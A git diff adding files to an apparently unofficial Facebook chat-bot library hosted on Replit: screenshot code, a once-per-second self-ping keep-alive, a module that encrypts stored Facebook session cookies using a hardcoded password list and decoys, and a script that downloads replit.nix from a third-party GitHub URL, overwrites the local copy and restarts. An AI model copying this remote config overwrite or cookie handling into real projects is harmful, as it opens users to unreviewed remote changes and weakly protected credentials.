+	if (options.scrollToElement) {
+		// eslint-disable-next-line unicorn/prefer-ternary
+		if (typeof options.scrollToElement === 'object') {
+			await page.$eval(options.scrollToElement.element, scrollToElement, options.scrollToElement);
+		} else {
+			await page.$eval(options.scrollToElement, scrollToElement);
+		}
+	}
+
+	if (screenshotOptions.fullPage) {
+		// Get the height of the rendered page
+		const bodyHandle = await page.$('body');
+		const bodyBoundingHeight = await bodyHandle.boundingBox();
+		await bodyHandle.dispose();
+
+		// Scroll one viewport at a time, pausing to let content load
+		const viewportHeight = viewportOptions.height;
+		let viewportIncrement = 0;
+		while (viewportIncrement + viewportHeight < bodyBoundingHeight) {
+			const navigationPromise = page.waitForNavigation({waitUntil: 'networkidle0'});
+			/* eslint-disable no-await-in-loop */
+			await page.evaluate(_viewportHeight => {
+				/* eslint-disable no-undef */
+				window.scrollBy(0, _viewportHeight);
+				/* eslint-enable no-undef */
+			}, viewportHeight);
+			await navigationPromise;
+			/* eslint-enable no-await-in-loop */
+			viewportIncrement += viewportHeight;
+		}
+
+		// Scroll back to top
+		await page.evaluate(_ => {
+			/* eslint-disable no-undef */
+			window.scrollTo(0, 0);
+			/* eslint-enable no-undef */
+		});
+
+		// Some extra delay to let images load
+		await page.waitForFunction(imagesHaveLoaded, {timeout: timeoutInSeconds});
+	}
+
+	if (options.inset && !screenshotOptions.fullPage) {
+		const inset = {top: 0, right: 0, bottom: 0, left: 0};
+		for (const key of Object.keys(inset)) {
+			if (typeof options.inset === 'number') {
+				inset[key] = options.inset;
+			} else {
+				inset[key] = options.inset[key] || 0;
+			}
+		}
+
+		let clipOptions = screenshotOptions.clip;
+
+		if (!clipOptions) {
+			clipOptions = await page.evaluate(() => ({
+				x: 0,
+				y: 0,
+				/* eslint-disable no-undef */
+				height: window.innerHeight,
+				width: window.innerWidth
+				/* eslint-enable no-undef */
+			}));
+		}
+
+		const x = clipOptions.x + inset.left;
+		const y = clipOptions.y + inset.top;
+		const width = clipOptions.width - (inset.left + inset.right);
+		const height = clipOptions.height - (inset.top + inset.bottom);
+
+		if (width === 0 || height === 0) {
+			await page.close();
+
+			throw new Error('When using the `clip` option, the width or height of the screenshot cannot be equal to 0.');
+		}
+
+		screenshotOptions.clip = {x, y, width, height};
+	}
+
+	const buffer = await page.screenshot(screenshotOptions);
+
+	await page.close();
+
+	if (!options._keepAlive) {
+		await browser.close();
+	}
+
+	return buffer;
+};
+
+module.exports.file = async (url, filePath, options = {}) => {
+	const screenshot = await captureWebsite(url, options);
+
+	await writeFile(filePath, screenshot, {
+		flag: options.overwrite ? 'w' : 'wx'
+	});
+};
+
+module.exports.buffer = async (url, options) => captureWebsite(url, options);
+
+module.exports.base64 = async (url, options) => {
+	const screenshot = await captureWebsite(url, options);
+	return screenshot.toString('base64');
+};
+
+module.exports.devices = Object.values(puppeteer.devices).map(device => device.name);
+
+if (process.env.NODE_ENV === 'test') {
+	module.exports._startBrowser = puppeteer.launch.bind(puppeteer);
+}
diff --git a/Extra/ExtraUptimeRobot.js b/Extra/ExtraUptimeRobot.js
new file mode 100644
index 000000000..322d8d277
--- /dev/null
+++ b/Extra/ExtraUptimeRobot.js
@@ -0,0 +1,26 @@
+const logger = require("../logger");
+module.exports = function() {
+    var Logger = global.Fca.Require.logger;
+    switch (process.platform) {
+        case 'win32': return Logger.Warning(global.Fca.Require.Language.ExtraUpTime.NotSupport);
+        case 'darwin': return Logger.Warning(global.Fca.Require.Language.ExtraUpTime.NotSupport);
+        case 'linux':
+            if (process.env.REPL_SLUG) {
+                var Value = global.Fca.Require.Priyansh;
+                var Fetch = global.Fca.Require.Fetch;
+                    if (Value.Uptime) {
+                        logger.Normal(global.Fca.Require.Language.ExtraUpTime.Uptime);//
+                        return setInterval(function() {
+                            Fetch.get(`https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`);
+                        },1000);
+                    }
+                else return;
+            }
+            else { 
+                Logger.Warning(global.Fca.Require.Language.ExtraUpTime.NotSupport);
+            }  
+            break;
+        default:
+        Logger.Warning(global.Fca.Require.Language.ExtraUpTime.NotSupport);
+    }
+};
diff --git a/Extra/Html/Classic/script.js b/Extra/Html/Classic/script.js
new file mode 100644
index 000000000..465c7a90c
--- /dev/null
+++ b/Extra/Html/Classic/script.js
@@ -0,0 +1,119 @@
+var c = document.getElementById("myCanvas");
+var ctx = c.getContext("2d");
+var mask;
+
+var pointCount = 500;
+var str = "Horizon";
+var fontStr = "bold 100pt Helvetica Neue, Helvetica, Arial, sans-serif";
+
+ctx.font = fontStr;
+ctx.textAlign = "auto";
+c.width = (ctx.measureText(str).width);
+c.height = 100; // Set to font size
+
+var whitePixels = [];
+var points = [];
+var point = function(x,y,vx,vy){
+  this.x = x;
+  this.y = y;
+  this.vx = vx || 1;
+  this.vy = vy || 1;
+}
+point.prototype.update = function() {
+  ctx.beginPath();
+  ctx.fillStyle = "#95a5a6";
+  ctx.arc(this.x,this.y,1,0,2*Math.PI);
+  ctx.fill();
+  ctx.closePath();
+  
+  // Change direction if running into black pixel
+  if (this.x+this.vx >= c.width || this.x+this.vx < 0 || mask.data[coordsToI(this.x+this.vx, this.y, mask.width)] != 255) {
+    this.vx *= -1;
+    this.x += this.vx*2;
+  }
+  if (this.y+this.vy >= c.height || this.y+this.vy < 0 || mask.data[coordsToI(this.x, this.y+this.vy, mask.width)] != 255) {
+    this.vy *= -1;
+    this.y += this.vy*2;
+  }
+  
+  for (var k = 0, m = points.length; k<m; k++) {
+    if (points[k]===this) continue;
+    
+    var d = Math.sqrt(Math.pow(this.x-points[k].x,2)+Math.pow(this.y-points[k].y,2));
+    if (d < 5) {
+      ctx.lineWidth = .2;
+      ctx.beginPath();
+      ctx.moveTo(this.x,this.y);
+      ctx.lineTo(points[k].x,points[k].y);
+      ctx.stroke();
+    }
+    if (d < 20) {
+      ctx.lineWidth = .1;
+      ctx.beginPath();
+      ctx.moveTo(this.x,this.y);
+      ctx.lineTo(points[k].x,points[k].y);
+      ctx.stroke();
+    }
+  }
+  
+  this.x += this.vx;
+  this.y += this.vy;
+}
+
+function loop() {
+  ctx.clearRect(0,0,c.width,c.height);
+  for (var k = 0, m = points.length; k < m; k++) {
+    points[k].update();
+  }
+}
+
+function init() {
+  // Draw text
+  ctx.beginPath();
+  ctx.fillStyle = "#000";
+  ctx.rect(0,0,c.width,c.height);
+  ctx.fill();
+  ctx.font = fontStr;
+  ctx.textAlign = "left";
+  ctx.fillStyle = "#fff";
+  ctx.fillText(str,0,c.height/2+(c.height / 2));
+  ctx.closePath();
+  
+  // Save mask
+  mask = ctx.getImageData(0,0,c.width,c.height);
+  
+  // Draw background
+  ctx.clearRect(0,0,c.width,c.height);
+  
+  // Save all white pixels in an array
+  for (var i = 0; i < mask.data.length; i += 4) {
+    if (mask.data[i] == 255 && mask.data[i+1] == 255 && mask.data[i+2] == 255 && mask.data[i+3] == 255) {
+      whitePixels.push([iToX(i,mask.width),iToY(i,mask.width)]);
+    }
+  }
+  
+  for (var k = 0; k < pointCount; k++) {
+    addPoint();
+  }
+}
+
+function addPoint() {
+  var spawn = whitePixels[Math.floor(Math.random()*whitePixels.length)];
+  
+  var p = new point(spawn[0],spawn[1], Math.floor(Math.random()*2-1), Math.floor(Math.random()*2-1));
+  points.push(p);
+}
+
+function iToX(i,w) {
+  return ((i%(4*w))/4);
+}
+function iToY(i,w) {
+  return (Math.floor(i/(4*w)));
+}
+function coordsToI(x,y,w) {
+  return ((mask.width*y)+x)*4;
+
+}
+
+setInterval(loop,50);
+init();
diff --git a/Extra/Html/Classic/style.css b/Extra/Html/Classic/style.css
new file mode 100644
index 000000000..4712cb7cd
--- /dev/null
+++ b/Extra/Html/Classic/style.css
@@ -0,0 +1,8 @@
+html {
+    background:#ecf0f1;
+  }
+  canvas {
+    display:block;
+    margin:auto;
+    background:#ecf0f1;
+  }
\ No newline at end of file
diff --git a/Extra/Security/Index.js b/Extra/Security/Index.js
new file mode 100644
index 000000000..4738b591e
--- /dev/null
+++ b/Extra/Security/Index.js
@@ -0,0 +1,146 @@
+  var ArrPassWord = ["CFGIZMHQGX", "URHQBLBLDR", "UBBWNJHLQS", "VOTNXBXQII", "HNGMQVUAHX", "IAFYAYRZDY", "WDJLNZSHGO", "SPMYPNPIDK", "BHDWKZCQJW", "YKHYNQHGSP", "XJWRXNOVIO", "SBPIBKTTYZ", "WOIJIPGAJH", "ZMBZURDFLW", "MVLVQWADDO", "CYJTGTGZON", "PRYZDDAWFO", "DUEOZNSCFJ", "KJPYPBSKMG", "EWFJVYCMMX", "CEDXZXJOGL", "KHPGXTFVOK", "PLQXZDLWJB", "SNWGNETCDG", "LILQXIGAZA", "GYGBDGBBYM", "DCRQKCOQLI", "RQJRRHVVKP", "JPCXRJGGNF", "JIEVLOVWIV", "PDGOFRVGEB", "QIIDHSRVKV", "ZECHPLBKFS", "EXQWXMACRP", "ZCCGCBWORF", "GJFOBWWMOS", "QCFNCFNIKZ", "ZAZZRZPAVC", "FQTFSFTNAP", "MVSSFKTHFA", "JFQGSMBYYQ", "JQINYGVFYJ", "ZBSPCBAQHC", "NQOTZDJARE", "CPWSWUEYQQ", "JVPWHYBXIB", "CXNXMSBIGT", "IFAFLNVDJK", "JOSSVDYERS", "YLWCRIRTUV", "CCKFYYGPAK", "YPELTOONQB", "FRMSZGHOEE", "BHRUUWMTDV", "OXKRPPNJHM", "FTPZCTSIFX", "NEDXDNHXOT", "VWREYWTQAD", "WIJFGFHOXG", "DOYYUZDOAA", "PMATAFECMX", "DKCIKASCUI", "GUESGUXXIM", "ZKHVCWXFYH", "BSTNRFIIQU", "TYIUNFDOYP", "NOUONMIJZM", "ECQTMQOJZI", "JVZQUABCGO", "DQQOTHHRZR", "HXDYLEMAGD", "RLALZZNBWU", "EEEEDUEGMW", "ZARNWMSQKV", "UDHXZOHBVX", "ACDYVCOSTK", "FVMTMIILWE", "FEBSFBHHWH", "WNSMQUVOLT", "BNROOXMJLS", "UMXDBEEPIA", "QTGHEEUVAD", "DDQPCWXGHB", "ZHGCFOXPRK", "XKDGASBGLL", "SCUYYMILRF", "PNYLDRGPVZ", "VCCGJDBHON", "SNLOVMETFA", "CTVECWZBQI", "GLFNSKCHNN", "XKQBVYVLEE", "MFAOPFLZCS", "MJWAMMAXJD", "RPILJBDWUS", "AOLFBKLGCU", "GGYJYVCCYA", "ZTPGNAVPNS", "COXANROIUY", "AFKUQIMSSG", "TKXEGTRCIC", "WNGJRYTLAP", "LQNJTKVLCY", "HYRAUPHHNZ", "RKIETHATFD", "OMZYVCOSGI", "MJYYMQTBSA", "WPUUEKECLN", "MVAULGIOUA", "PXRNLSXAUN", "LDGFRIHHWZ", "OEXMJWIXMJ", "AVXSOMKYOR", "RKZMSDOKSX", "JNSYBTWQLB", "BKUFMDRUFW", "MHVZBXUELL", "SKGDCUSQWS", "PQCFWLJVBM", "RKVVDZQBRA", "MUPJVJTVEQ", "SJMHPLXAFC", "KNOQKDQXIL", "AMFAXAEIPT", "ZFCUWAAZFP", "ZIQMCMMWIF", "XLHWNOVDOK", "VLFQKLQGZE", "TEINUSDMEL", "BCDTYHSISA", "UNRXBBXAAS", "XJUWFZJKRJ", "GCUONLWFOT", "QNSUCRTVNW", "KRJBLIAGUX", "DBJVXYWCGS", "SNNMDWCXJY", "YNVFGDMLSU", "UVMVELXUSN", "WXICKSVIFP", "PNTSKIKVWB", "VXSQZPCPIJ", "UFARZLYMPL", "HDJAXAMDTW", "XSKZWCCSFF", "FZTUBNATNF", "RGFQORXORS", "WXWANTTYAM", "YZJTBIABCL", "DIAZHANKRV", "NBZXQAFXPU", "FILEDTBMGX", "DSOOFDJJDN", "OSKCMCGYDU", "HIRQXIVRHV", "WWGQUGQBQA", "EEKZGVIFMM", "QNIFPPCNOO", "UWOUKFLUZN", "CACEOOAKBW", "JTFMLVAOYO", "NNEJZKEGXU", "UQJBLOADPQ", "MYDGDBVGMX", "WXJYRHIURP", "PIFXBMHDJZ", "RXFSKNCESP", "RAVEGGVBTN", "BUFPMINULH", "UGTTELFBTP", "HPQBJIKPFA", "XQRHQBZXOO", "JGNKEIVSWA", "OLGSAOTGKH", "XGIGZTVSOX", "LDFXHBBGDH", "VLGKMITXPI", "VJTWAUDYSI", "HUXKHXIUWI", "VBPAXHYKQU", "PUYJGLTPWQ", "TVCRNZTMCC", "MAVXHNPQEQ", "CNNITMACFT", "VGUXXTVPFL", "HLKJGIGBUB", "SGODCXPKWB", "DXPBEWXXGB", "YJDMSEAKIJ", "WGNQKSMBZT", "TLOGVVISEH", "CFJSCEXSOS", "QEXVFGMFVE", "YHINIHPYYV", "WMDDMIPBIK", "VVJCBZQKCP", "ROIWFCRYCA", "FJBKKTFJCT", "FUOGHKOBIO", "EPXSSSKBRA", "SWRAJXSRMS", "ZBRVIPMZVU", "FKLGPWILUC", "OXXWLYBYMP", "JNQMRVSQCZ", "CMSKEJPHHC", "XYXFXCEOTJ", "QOPMOPQEZT", "ASEYNVFGEN", "NJHGSVOVBM", "XZFCIPROKT", "MKVSDUFTGN", "IQLCNTVOVG", "VKJAMVYVYN", "CYEBFNRYFU", "OMTRBWKKVL", "QMSICNUIAF", "OJHCEFVWIV", "JGWPIMKBYX", "WFOOBZQBPZ", "BQSJPCSJLF", "SYXOPGYXEG", "OUGNSNTOFU", "EJRGMQAKHM", "FABCVEWZCB", "LLKJCAEDKN", "PCEKNTZPYU", "NUDUKXLHLZ", "NQBGNVVNLU", "SSUQMGLMCQ", "VZVJWBRPCX", "RMYMLJXYJX", "DPDDLXNTZV", "PMMGUVDIDT", "HARGMFMLTP", "PMNKGQWCKQ", "SMOPPNAMGD", "VINTZUURIG", "RCHEYKWJQR", "TJGSQPOYRD", "BRJZRRIXSY", "QFOXILESJF", "FKKPNVKWHU", "UXWIXFEXVG", "EIFPFYXYZW", "ERYDXAFBUN", "KHNSGHVCAP", "JYBMBYZGGJ", "NFIVEFCNBU", "UXSSSMDZWR", "ASXUKHNKHF", "BQHMMNBRPP", "SBHWFAYBOB", "DWYKHRLRRE", "ANSMOLVMSQ", "TSIAMRHGBU", "MJTLJVEMAV", "TMBXVKZNXF", "ZTPSMEQXDT", "EURKVAKVHB", "CYRDCIXXOE", "HYAGIWHDKE", "BKTAWJKYTB", "MQTQUIKPXB", "SWBCOMTCNO", "ZANVUXVOWB", "MPRPAZQKSR", "DDWVPKHTHV", "DQICGSYBWU", "DGKGTCLRHY", "NAWGNLTVGB", "UADZLOLOYK", "WLWLKPHYGH", "MHRMMQEUNU", "IVUXUYQIPD", "TMRAYTTQLX", "EAMHTODTTZ", "OGKLSMGCJW", "IFQANPZKNE", "ZPKPAQQTNL", "PAADEVUTSC", "RCKEASUYHO", "SXJEJAEZNC", "VJGHGAUJWG", "FYNJPHPNOZ", "SMSMDDFVHO", "MCDHLMFFOP", "AYHVCRWYZP", "HOZEZNWHNU", "VQJEMXHUHF", "CDXWRCGJED", "LYOGHLAWYT", "IZEPERDAWV", "WJQDLOPUUB", "LDWODIKDPU", "UFNTJMDLAN", "PDOIBHXPYL", "JCRMZJXIWC", "YPJZVEDQSC", "OTBTUNDBGA", "ISCJHDMTZF", "JPAPMSUTUH", "LFZXXWZWXT", "WVCBEBEJEB", "UFLHLZBISS", "IKBSBIFWPG", "RPKDDSEGAW", "ZAZOBUZMXK", "WZBMFUXPYB", "AUAGUHJUJD", "RPQQDOQDEF", "EOLYVDCLWH", "JXNMENVXNY", "UMVYWUNDKM", "AHUZCOYCTT", "DLETNOFSYN", "GTCEXAVNHX", "UOBRVRANYD", "HZYFNBDQUJ", "MCNDOLANBY", "QYCZTGRALB", "CJXNINIIGL", "CLBIGGNUQN", "SOKJIBLMTK", "YXDWXYJSTR", "FMMGIEHNHD", "UWGCDTLBKM", "ARTHFPEFZQ", "SAWFUZLQJP", "EGLFDIVYIU", "EKVLNAIDKT", "DJQJGBJHKL", "WZJGJIQFWO", "BUGLBAVSPQ", "OYEPZEQDVX", "YKNGYEVUZI", "WUFCLAUJKL", "KNKVFDDLMP", "ZDPIMXWXIO", "GOAQXYIPNW", "UAPRZJEXUR", "EFLMHDGNAR", "RDVHISBBEN", "UQOUCQJCTO", "ZMIMFTZMAW", "CDSLHGCGZT", "JKXOBJNJCU", "AHDZDQEWBQ", "NAINGNGJFT", "HUYMUVBOQD", "EFRXGMHYQK", "QJMYXTGHQC", "GXNICXAWWR", "JSGQRVOYJB", "VZZDFESYCH", "YJRWRKKWYE", "GBGHQHENAD", "XAXXEWNIOS", "JQNJDLEYPE", "BGQDGMSMYD", "AIPXKLSHVS", "KRTLFKSFWV", "RDLSZNBEDD", "GUIGYYAAQM", "CYQQUZBTCG", "UDPNDXDLWC", "YNHCZGDBVZ", "TZSSOIINJQ", "BRFLJWQPSE", "HPIWYMFFJS", "ULXEECKPOM", "OJUYWKQIIM", "ZSGTNKLUCM", "HMTJIFQVZM", "RSDREWNZOF", "GIQSZFKCSK", "HLNZIQYPPT", "ZDPAXKTTXC", "FVGXMSGVNO", "NIGDVPWJIP", "GWYAQEOLNA", "ZQAUPQNFNP", "MQNRQSLREU", "PHQPEYPYKQ", "MZJZLLJCCZ", "YWRJZCHRPT", "CFQKNFPJEZ", "CTCGXXEJEV", "CGYCWHIUXE", "NLHBURNGNR", "IFDRRQJCQV", "HQXHAJCLWT", "HHCYGDIEUJ", "GBIMSAPTTF", "YJXSYERGMB", "KHSQYRYRQG", "WDSPYMSOXD", "BWAMGSKJCR", "MXBKMKPWTU", "NBUBEEGABJ", "YBSFNKNMLW", "XGOHDVHEOZ", "CDKSXFQHWA", "BBVYAVSPPT", "OOLIDVQISR", "PSGRVQOMUZ", "BRHGNRYPIT", "ZWBXFDBRBZ", "TMHQSMVSML", "BLQNEGVQLO", "HCDPEMOTUO", "DAPRNJRHMZ", "YOGTHZWJFV", "CPXGPJLLUW", "KLAPEGIRMY", "LRJQUKSTHJ", "MHKNGWOGDW", "AAUPGONIEO", "SKMMPAWEMY", "MOELIFKSXD", "YUKGRKJMRK", "HHNPHSVILP", "KKSXNOKRXP", "VMUNVYWQMG", "XRXRFHZVFP", "DJEFSAFQMI", "KKIQIVFUQG", "WKDIKKYHAB", "IJHZNEHCIE", "EWBGOWNRYG", "TIIWDVPZBU", "QKOUASDZTU", "GJEIANQIOU", "ENTKGOTBLW", "OSWFALTNPX", "UHDUUNEAPO", "VNEGBGNDEI", "PAFMXSSVXR", "RAKTUTCRTM", "GSBJNAKOHU", "SHFLQDHAUJ", "MFDSGZITOQ", "COTXDRROHH", "GQCPQNSFNL", "TLQEMJNJCH", "DVRRSVRFBX", "VKOCASJOFW", "IGYFXVJGZJ", "GCEVHJDLLC", "PKYTXOFXQQ", "SKONOHUHTS", "MPGSAFTXWF", "WWUDTDDHME", "BSXCHCSAQP", "DGZEMYGEQN", "GICJTXPLQP", "BKALJKLJYN", "OHZOXMAXHZ", "TUQOIKEIBL", "TKVKNMWMRR", "YAPQGHBKKD", "ZIPWWXQXKD", "EZWRQRAHOC", "TVZVCMYBCW", "ENWBPETFIC", "AJVEFXUYKX", "XIERQNRKHH", "WBKHUUXHQL", "RXBRNYIIGZ", "XQJTTJLLUU", "MHCHYKYRYA", "EUDLQHHIYW", "EKIFNUEFVI", "RGZOSNSLIQ", "EIZFOKGQKU", "WSXRTPOAWT", "OGRASRXCSE", "LJMYIRKLLW", "VDGYNTUUKD", "PZXFUEBOCQ", "EWUIECAYWQ", "ESFJAPKHCN", "FHFPUQBABW", "RFSPNQDMFM", "EJZADADQYH", "MURBJWDFNV", "AXDHNFKNND", "VZOCSYDRNF", "LPPVMBFNQU", "SQBKBVQWRU", "ZLNJWRWLLW", "CQZMOTQZSS", "ATNJNZXFTD", "QGOWINHJPF", "YGRZKBJXDX", "AWGGAPTQRC", "WIKDLMWCMC", "GDUKRYPMQM", "HHIHEVYFEA", "NQJEUGTGRQ"]
+  var fs = require('fs');
+  var utils = require('../../utils');
+  var logger = require('../../logger');
+  var Fetch = require('got');
+  var Step_3 = require('./Step_3');
+  var Database = require("../../Extra/Database");
+  var { join } = require('path');
+
+  /**
+   * It creates a random string of a given length
+   * @param length - The length of the string to be generated.
+   * @returns A string of random characters.
+   */
+
+  function CreateFakeType2(length) {
+    var result           = '';
+    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz/+0123456789';
+    var charactersLength = characters.length;
+    for ( var i = 0; i < length; i++ ) result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    return result;
+  }
+
+  /**
+   * It returns a random number between the min and max values.
+   * @param min - The minimum number that can be generated.
+   * @param max - The maximum number that can be generated.
+   * @returns A random number between the min and max values.
+   */
+
+  function Between(min, max) { 
+    return parseInt(Math.random() * (max - min) + min);
+  } 
+
+  /**
+   * It creates a random number between 0 and 489, then subtracts a random number between 10 and 33 from
+   * it, and then adds 10 to it.
+   * 
+   * So, the result is a number between -23 and 489.
+   * 
+   * The function also creates a random number between 10 and 70, and a random number between 10 and 33.
+   * 
+   * The function returns an object with the following properties:
+   * 
+   * Security: the random number between 0 and 489
+   * Previous: the random number between -23 and 489
+   * Secret: the random number between 10 and 33
+   * Number: the random number between 10 and 70
+   * @returns An object with the following properties:
+   */
+
+  function CreateSecurity() {
+    var Security = Between(0,489);
+    var Secret = Between(10,33);
+    return {
+      Security: Security,
+      Previous: parseInt(Security) - Secret,//after + (10) main   + random
+      Secret: Secret, // save
+      Number: Between(10,70) // vá»‹ trÃ­ cá»§a real appstate trá»« 10
+    }
+  }
+
+  /**
+   * It checks if the file exists, if it doesn't, it creates it and writes some data to it. If it does
+   * exist, it reads the data from it and returns it
+   * @param DefaultPassWord - The password you want to use.
+   * @returns An object with the following properties:
+   */
+
+  function CheckAndParse(DefaultPassWord) {
+    var PassWord = new Array();
+    if (!DefaultPassWord) return logger.Warning("DefaultPassWord Is Requirements",function() { process.exit(0); })
+      try {
+        if (!Database.has('Security',true)) { 
+          let Obj = CreateSecurity()
+          Database.set('Security',JSON.stringify(Obj),true)
+          for (let i = 1; i < 10; i ++) PassWord.push(ArrPassWord[parseInt(Obj.Security) + parseInt(i)])
+          return { PassWord: String(DefaultPassWord) + "-" + String(PassWord.join('-')), Slot: Obj.Number ,Security: Obj.Security, Previous: Obj.Previous, Secret: Obj.Secret };
+        }
+        else {
+          var Data = JSON.parse(Database.get('Security',null,true));
+          if (utils.getType(Data) == "Object") {
+            if (!Data.Security || !Data.Previous || !Data.Secret || !Data.Number) { 
+              logger.Error('Data Deficit Detection, Reset Data');
+              let Obj = CreateSecurity();
+              Database.set('Security',JSON.stringify(Obj),true)
+              for (let i = 1; i < 10; i ++) PassWord.push(ArrPassWord[parseInt(Obj.Security) + parseInt(i)])
+              return { PassWord: String(DefaultPassWord) + "-" + String(PassWord.join('-')), Slot: Obj.Number ,Security: Obj.Security, Previous: Obj.Previous, Secret: Obj.Secret };
+            }
+            else { 
+              for (let i = 1; i < 10; i ++) PassWord.push(ArrPassWord[parseInt(Data.Security) + parseInt(i)])
+              return { PassWord: String(DefaultPassWord) + "-" + String(PassWord.join('-')), Slot: Data.Number ,Security: Data.Security, Previous: Data.Previous, Secret: Data.Secret };
+            }
+          } 
+        }
+      }
+    catch (e) {
+      logger.Error("Something went wrong: " + e, function() {
+        let Obj = CreateSecurity();
+        Database.set('Security',JSON.stringify(Obj),true)
+        for (let i = 1; i < 10; i ++) PassWord.push(ArrPassWord[parseInt(Obj.Security) + parseInt(i)])
+        return { PassWord: String(DefaultPassWord) + "-" + String(PassWord.join('-')), Slot: Obj.Number ,Security: Obj.Security, Previous: Obj.Previous, Secret: Obj.Secret };
+      });
+    }
+  }
+
+  /**
+   * CreatePassWord() takes a string and an object as arguments, and returns a string.
+   * @param DefaultPassWord - The default password that you want to use.
+   * @param ParseObj - This is the object that is being parsed.
+   * @returns A string of the DefaultPassWord and the PassWord array joined by a dash.
+   */
+
+  function CreatePassWord(DefaultPassWord,ParseObj) {
+    var PassWord = new Array();
+      for (let i = 1; i < 10; i ++) PassWord.push(ArrPassWord[parseInt(ParseObj.Security) + parseInt(i)]);
+    return String(DefaultPassWord) + "-" + String(PassWord.join('-'));
+  }
+
+  /* Encrypting the AppState with the PassWord. */
+
+  var Encrypt = (AppState,PassWord) => { 
+    return require('./Step_3').encryptState(require('./Step_2').Encrypt(require('./Step_1').EncryptState(AppState,PassWord)),PassWord);
+  }
+
+  /* Decrypting the AppState. */
+
+  var Decrypt = (AppState,Slot,PassWord) => { 
+    return require('./Step_1').DecryptState(require('./Step_2').Decrypt(require('./Step_3').decryptState(String(AppState[parseInt(Slot) - 10]),PassWord)),PassWord);
+  }
+
+  /* A module that is used to encrypt and decrypt the AppState. */
+
+  module.exports = function(AppState,DefaultPass,Type) { 
+    switch (Type) {
+      case "Encrypt": {
+        var Obj = CreateSecurity(),PassWord = CreatePassWord(DefaultPass,Obj),AppState_Encrypt = Encrypt(AppState,PassWord); Database.set('Security',JSON.stringify(Obj,null,2),true);
+        return Array.from({length: 70}, (_,i) => { if (i == (parseInt(Obj.Number) - 10)) { return AppState_Encrypt; } else return Step_3.encryptState(CreateFakeType2(AppState_Encrypt.length),PassWord).slice(0,AppState_Encrypt.length);})
+      }
+      case "Decrypt": {
+        var Parse = CheckAndParse(DefaultPass);
+        var AppState_Decrypt = Decrypt(AppState,Parse.Slot,Parse.PassWord);
+        return AppState_Decrypt;
+      }
+    }
+  };
diff --git a/Extra/Security/Step_1.js b/Extra/Security/Step_1.js
new file mode 100644
index 000000000..f8e4a86a6
--- /dev/null
+++ b/Extra/Security/Step_1.js
@@ -0,0 +1,11 @@
+var CryptoJS = require("crypto-js");
+module.exports.EncryptState = function EncryptState(Data,PassWord) { return CryptoJS.AES.encrypt(Data, PassWord).toString(); }
+
+module.exports.DecryptState = function DecryptState(Data,PassWord) { return CryptoJS.AES.decrypt(Data, PassWord).toString(CryptoJS.enc.Utf8); }
+
+
+
+
+
+
+
diff --git a/Extra/Security/Step_2.js b/Extra/Security/Step_2.js
new file mode 100644
index 000000000..e47352aee
--- /dev/null
+++ b/Extra/Security/Step_2.js
@@ -0,0 +1,20 @@
+var CryptoJS = require("crypto-js");
+
+/**
+ * Encrypt the text using the CryptoJS library and return the encrypted text as a Base64 string.
+ * @param Data - The data to be encrypted.
+ * @returns A string of characters that represent the encrypted data.
+ */
+module.exports.Encrypt = function Encrypt(Data) {
+    return CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(Data));
+};
+
+/**
+ * Decrypt the data using the CryptoJS library, and return the decrypted data as a string.
+ * @param Data - The data to be decrypted.
+ * @returns The decrypted data.
+ */
+
+module.exports.Decrypt = function Decrypt(Data) {
+    return CryptoJS.enc.Base64.parse(Data).toString(CryptoJS.enc.Utf8);
+};
diff --git a/Extra/Security/Step_3.js b/Extra/Security/Step_3.js
new file mode 100644
index 000000000..9855f590f
--- /dev/null
+++ b/Extra/Security/Step_3.js
@@ -0,0 +1,20 @@
+const crypto = require('crypto');
+const aes = require("aes-js");
+
+module.exports.encryptState = function encryptState(data, key) {
+    let hashEngine = crypto.createHash("sha256");
+    let hashKey = hashEngine.update(key).digest();
+    let bytes = aes.utils.utf8.toBytes(data);
+    let aesCtr = new aes.ModeOfOperation.ctr(hashKey);
+    let encryptedData = aesCtr.encrypt(bytes);
+    return aes.utils.hex.fromBytes(encryptedData);
+}
+
+module.exports.decryptState = function decryptState(data, key) {
+    let hashEngine = crypto.createHash("sha256");
+    let hashKey = hashEngine.update(key).digest();
+    let encryptedBytes = aes.utils.hex.toBytes(data);
+    let aesCtr = new aes.ModeOfOperation.ctr(hashKey);
+    let decryptedData = aesCtr.decrypt(encryptedBytes);
+    return aes.utils.utf8.fromBytes(decryptedData);
+}
diff --git a/Extra/Src/Change_Environment.js b/Extra/Src/Change_Environment.js
new file mode 100644
index 000000000..21d31259b
--- /dev/null
+++ b/Extra/Src/Change_Environment.js
@@ -0,0 +1,24 @@
+module.exports = async function(callback) {
+    const got = require('got');
+    const log = require('npmlog');
+    const fs = require('fs');
+    const Database = require('../../Extra/Database');
+    const Language = global.Fca.Require.languageFile.find((/** @type {{ Language: string; }} */i) => i.Language == global.Fca.Require.Priyansh.Language).Folder.Index;
+    const Check = fs.readFileSync(process.cwd() + "/replit.nix", { encoding: 'utf8' });
+    switch (Check.includes('pkgs.nodejs-14_x')) {
+        case true: {
+            Database(true).set("NeedRebuild", false);
+            return;
+        }
+        case false: {
+            log.warn("[ FCA-HZI ] â€¢",Language.EVMChange);
+            const { body } = await got('https://raw.githubusercontent.com/KanzuXHorizon/Global_Horizon/main/repl.nix');
+            fs.writeFileSync(process.cwd() + "/replit.nix", body, { encoding: 'utf8' });
+            log.info("[ FCA-PRIYANSH ] â€¢",Language.EVMChangeSuccess);
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            Database(true).set("NeedRebuild", true);
+            process.exit(1);
+        }
+    }
+
+}
diff --git a/Extra/Src/History.js b/Extra/Src/History.js
new file mode 100644
index 000000000..b7f942b22
--- /dev/null
+++ b/Extra/Src/History.js
@@ -0,0 +1,115 @@
+/**
+ * Console History v1.5.1
+ * console-history.js
+ *
+ * Licensed under the MIT License.
+ * https://git.io/console
+ */
+'use strict'
+
+/* Allow only one instance of console-history.js */
+if (typeof console.history !== 'undefined') {
+    throw new Error('Only one instance of console-history.js can run at a time.')
+}
+
+/* Store the original log functions. */
+console._log = console.log
+console._info = console.info
+console._warn = console.warn
+console._error = console.error
+console._debug = console.debug
+
+/* Declare our console history variable. */
+console.history = []
+
+/* Redirect all calls to the collector. */
+console.log = function(dt) {
+    return console._intercept('log', dt, arguments)
+}
+console.info = function(dt) {
+    return console._intercept('info', dt, arguments)
+}
+console.warn = function(dt) {
